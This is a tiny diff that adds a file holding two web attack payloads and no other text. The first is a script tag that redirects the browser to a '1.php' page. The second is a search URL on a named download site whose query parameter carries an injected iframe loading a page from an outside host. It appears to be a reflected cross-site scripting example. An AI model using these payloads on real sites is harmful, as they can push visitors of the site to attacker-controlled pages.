@@ -1,0 +1,5 @@
+<script language="javascript" type="text/javascript">
+           window.location.href="www.localhost:8080/1.php"
+    </script>
+
+www.heibai.net/download/search.php?type=name&key=<iframe src=http://www.dyyz.net.cn/1.php></iframe>
